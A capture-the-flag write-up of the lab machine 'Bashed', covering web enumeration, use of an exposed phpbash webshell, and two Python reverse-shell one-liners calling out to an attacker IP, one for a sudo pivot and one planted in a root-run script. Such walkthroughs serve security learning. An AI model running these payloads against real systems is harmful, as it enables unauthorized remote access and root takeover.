# Bashed

## Nmap scan:
```
Nmap scan report for 10.129.17.235
Host is up (0.017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

## Writeup:
Nmap scan reveals only one (1) port open, that being port `80`.
Navigating to the hosted website, it seems that it's the personal website of a developer.
The developer has created a pentest tool called `phpbash`, which seems to mainly be an advanced webshell.
Exploring the site, I find the following on `/single.html`:
```phpbash helps a lot with pentesting. I have tested it on multiple different servers and it was very useful. I actually developed it on this exact server!```

This makes it pretty clear that the goal is finding the existing instance of `phpbash` present on the server.
I start by running a quick directory enumeration scan with `gobuster`.

- `gobuster dir --url 'http://10.129.17.235' --wordlist ~/SecLists/Discovery/Web-Content/big.txt`

This reveals quite a lot of directories:
```
.htpasswd            (Status: 403) [Size: 297]
.htaccess            (Status: 403) [Size: 297]
css                  (Status: 301) [Size: 312] [--> http://10.129.17.235/css/]
dev                  (Status: 301) [Size: 312] [--> http://10.129.17.235/dev/]
fonts                (Status: 301) [Size: 314] [--> http://10.129.17.235/fonts/]
images               (Status: 301) [Size: 315] [--> http://10.129.17.235/images/]
js                   (Status: 301) [Size: 311] [--> http://10.129.17.235/js/]
php                  (Status: 301) [Size: 312] [--> http://10.129.17.235/php/]
server-status        (Status: 403) [Size: 301]
uploads              (Status: 301) [Size: 316] [--> http://10.129.17.235/uploads/]
```

the main one of interest is `/dev`, as this likely refers to development.
True enough, `/dev/phpbash.php` leads to a running instance of `phpbash` :)

After a bit of enumeration I only find one lead, that being a `/scripts` directory within the the `root` directory.
This contains `test.txt` and `test.py`.
All `test.py` does is write `testing 123!` to a file called `test.txt`.
Interestingly enough, `test.txt` is root owned.
However, as `www-data` I can't really do much, as `test.py` and `/scripts` are owned by `scriptmanager`.

Running `sudo -l` though, I discover that I can run any command in the context of `scriptmanager`, which opens up some interesting possibilities.

I first pivot to `scriptmanager` by running a `python` reverse shell payload as so:
- `sudo -u scriptmanager python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.217",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`

From then on I can now write to `scripts/` and `test.py`.
I suspect that the `root` user may run any script placed into `scripts`, so I insert the following payload into `script.py` within `/scripts` and make sure my listener is running:
```
import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.15.217",int(9002)));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
```

After a couple seconds, this pops a `root` shell :D
I then grab the `root.txt` from `/root`.
